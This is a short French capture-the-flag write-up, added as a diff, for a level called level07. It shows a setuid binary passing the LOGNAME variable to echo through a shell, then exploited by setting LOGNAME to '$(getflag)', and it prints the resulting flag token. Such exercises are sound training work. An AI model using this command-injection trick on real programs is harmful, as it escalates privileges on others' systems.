@@ -1,0 +1,19 @@
+un binaire level07 qui affiche level07
+$> ./level07
+level07
+
+en utilisant la commande string on voit que level07 utilise la commande echo avec un parametre
+$> strings level07
+/bin/echo %s
+
+si on change la variable d'environement LOGNAME le message change:
+$> export LOGNAME=test
+
+$> ./level07
+test
+
+on set LOGNAME a '$(getflag)' pour qu'il soit interprete en meme temps que le echo par le user flag07
+$> export LOGNAME='$(getflag)'
+
+$> ./level07
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
